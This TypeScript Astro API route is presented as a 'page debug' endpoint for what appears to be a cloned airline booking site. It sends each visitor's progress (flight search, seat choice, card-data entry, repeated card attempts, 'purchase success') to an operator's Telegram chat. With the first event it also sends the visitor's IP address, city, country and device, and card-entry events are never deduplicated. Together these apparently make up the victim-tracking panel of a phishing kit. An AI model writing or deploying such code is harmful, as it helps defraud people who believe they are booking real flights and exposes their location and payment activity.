export const prerender = false;

import type { APIRoute } from 'astro';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';

const PAGE_EVENTS = [
  'Buscando vuelos',
  'Eligiendo vuelo de ida',
  'Eligiendo vuelo de vuelta',
  'Viendo resumen de vuelos',
  'Escogiendo asiento ida',
  'Escogiendo asientos vuelta',
  'Escogiendo maletas',
  'Datos de pasajero',
  'Pagina de pago',
  'Abrio banner de pago',
  '✅ Ingreso datos cc',
  'Devuelta a ingresar tarjeta',
  'Compra exitosa',
] as const;

type PageDebugEvent = (typeof PAGE_EVENTS)[number];

const REPEAT_EVENTS = new Set<string>([
  'Devuelta a ingresar tarjeta',
  '✅ Ingreso datos cc',
]);

const recentEvents = (globalThis as typeof globalThis & {
  __latamPageEventAt?: Map<string, number>;
}).__latamPageEventAt ?? new Map<string, number>();
(globalThis as typeof globalThis & { __latamPageEventAt?: Map<string, number> }).__latamPageEventAt = recentEvents;

function requestIp(request: Request) {
  const forwarded = request.headers.get('x-forwarded-for') || '';
  const raw =
    forwarded.split(',')[0]?.trim()
    || request.headers.get('x-real-ip')
    || request.headers.get('x-vercel-forwarded-for')
    || '';
  return raw.replace(/^::ffff:/, '').trim() || 'unknown';
}

const COUNTRY_ES: Record<string, string> = {
  PY: 'Paraguay',
  AR: 'Argentina',
  BR: 'Brasil',
  CL: 'Chile',
  CO: 'Colombia',
  PE: 'Perú',
  UY: 'Uruguay',
  BO: 'Bolivia',
  EC: 'Ecuador',
  VE: 'Venezuela',
  MX: 'México',
  US: 'Estados Unidos',
  ES: 'España',
  PA: 'Panamá',
  CR: 'Costa Rica',
  GT: 'Guatemala',
  HN: 'Honduras',
  SV: 'El Salvador',
  NI: 'Nicaragua',
  DO: 'República Dominicana',
  CU: 'Cuba',
  CA: 'Canadá',
  DE: 'Alemania',
  FR: 'Francia',
  IT: 'Italia',
  GB: 'Reino Unido',
};

function flagEmoji(code: string) {
  const cc = code.trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc) || cc === 'XX' || cc === 'T1') return '';
  return String.fromCodePoint(...[...cc].map((char) => 127397 + char.charCodeAt(0)));
}

function isPrivateIp(ip: string) {
  if (!ip || ip === 'unknown' || ip === '::1') return true;
  if (ip.startsWith('127.') || ip.startsWith('10.') || ip.startsWith('192.168.')) return true;
  const match = ip.match(/^172\.(\d+)\./);
  if (!match) return false;
  const octet = Number(match[1]);
  return octet >= 16 && octet <= 31;
}

type VisitorGeo = {
  ip: string;
  code: string;
  city: string;
  country: string;
};

async function lookupIpGeo(ip: string): Promise<Partial<VisitorGeo>> {
  if (isPrivateIp(ip)) return {};
  try {
    const res = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, {
      signal: AbortSignal.timeout(4000),
    });
    const data = (await res.json()) as {
      success?: boolean;
      country?: string;
      country_code?: string;
      city?: string;
    };
    if (!data?.success) return {};
    const code = String(data.country_code || '').toUpperCase();
    return {
      code,
      city: String(data.city || '').trim(),
      country: COUNTRY_ES[code] || String(data.country || '').trim(),
    };
  } catch {
    return {};
  }
}

async function resolveVisitorGeo(request: Request): Promise<VisitorGeo> {
  const ip = requestIp(request);
  let code = (
    request.headers.get('x-vercel-ip-country')
    || request.headers.get('cf-ipcountry')
    || request.headers.get('x-country-code')
    || ''
  ).trim().toUpperCase();
  let city = '';
  try {
    city = decodeURIComponent(request.headers.get('x-vercel-ip-city') || '').trim();
  } catch {
    city = String(request.headers.get('x-vercel-ip-city') || '').trim();
  }
  let country = COUNTRY_ES[code] || '';
  if (!code || code === 'XX' || !country) {
    const looked = await lookupIpGeo(ip);
    code = looked.code || code;
    city = looked.city || city;
    country = looked.country || COUNTRY_ES[code] || country;
  }
  return {
    ip,
    code,
    city,
    country: country || COUNTRY_ES[code] || code || '-',
  };
}

function deviceFromUa(ua: string) {
  const raw = String(ua || '');
  if (/iPhone/i.test(raw)) return '📱 iPhone';
  if (/iPad/i.test(raw)) return '📱 iPad';
  if (/Android/i.test(raw) && /Mobile/i.test(raw)) return '📱 Android';
  if (/Android/i.test(raw)) return '📱 Android tablet';
  if (/Windows Phone/i.test(raw)) return '📱 Windows Phone';
  if (/Windows/i.test(raw)) return '💻 Windows';
  if (/Macintosh|Mac OS X/i.test(raw)) return '💻 Mac';
  if (/CrOS/i.test(raw)) return '💻 Chromebook';
  if (/Linux/i.test(raw)) return '💻 Linux';
  if (/Mobile|webOS|BlackBerry|Opera Mini|IEMobile/i.test(raw)) return '📱 Móvil';
  return '💻 Escritorio';
}

function visitorIpMessage(geo: VisitorGeo, userAgent: string) {
  const flag = flagEmoji(geo.code);
  const place = [geo.city, geo.country].filter(Boolean).join(', ') || '-';
  const ipLine = ['🌐 IP:', geo.ip || '-', flag, place].filter(Boolean).join(' ').replace(/\s+/g, ' ').trim();
  return `${ipLine}\n${deviceFromUa(userAgent)}`;
}

function takeEventSlot(ip: string, event: string) {
  const key = `${ip}|${event}`;
  const now = Date.now();
  const last = recentEvents.get(key) || 0;
  if (now - last < 20000) return false;
  recentEvents.set(key, now);
  return true;
}

function json(data: unknown, init: ResponseInit = {}) {
  return new Response(JSON.stringify(data), {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
      ...init.headers,
    },
  });
}

function telegramConfig() {
  return {
    token: TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN || '',
    chatId: TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID || '',
  };
}

async function telegramApi(method: string, payload: Record<string, unknown>) {
  const { token } = telegramConfig();
  if (!token) return { ok: false, skipped: 'telegram-env-missing' as const };
  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  let description = '';
  try {
    const data = (await response.json()) as { description?: string };
    description = String(data?.description || '');
  } catch {
    /* ignore */
  }
  return { ok: response.ok, status: response.status, description };
}

async function sendTelegramText(text: string) {
  const { token, chatId } = telegramConfig();
  if (!token || !chatId) return { sent: false, skipped: 'telegram-env-missing' as const };
  const result = await telegramApi('sendMessage', {
    chat_id: chatId,
    text,
    disable_web_page_preview: true,
  });
  if (result.skipped) return { sent: false, skipped: result.skipped };
  return result.ok
    ? { sent: true }
    : { sent: false, error: result.description || `telegram-${result.status || 'unknown'}` };
}

async function sendPageEvent(event: PageDebugEvent) {
  return sendTelegramText(event);
}

export const GET: APIRoute = async () => {
  const { token, chatId } = telegramConfig();
  return json({ configured: Boolean(token && chatId) });
};

export const POST: APIRoute = async ({ request }) => {
  let body: Record<string, unknown> = {};
  try {
    body = await request.json();
  } catch {
    return json({ error: 'JSON invalido' }, { status: 400 });
  }

  const event = String(body.event || '') as PageDebugEvent;
  if (!PAGE_EVENTS.includes(event)) return json({ error: 'Evento page debug invalido' }, { status: 400 });

  if (!REPEAT_EVENTS.has(event) && !takeEventSlot(requestIp(request), event)) {
    return json({ event, telegram: { sent: false, skipped: 'deduped' } });
  }

  console.info('[debug-page-api:body]', body);
  if (event === 'Buscando vuelos') {
    const geo = await resolveVisitorGeo(request);
    await sendTelegramText(visitorIpMessage(geo, request.headers.get('user-agent') || ''));
  }
  const telegram = await sendPageEvent(event);
  return json({ event, telegram });
};
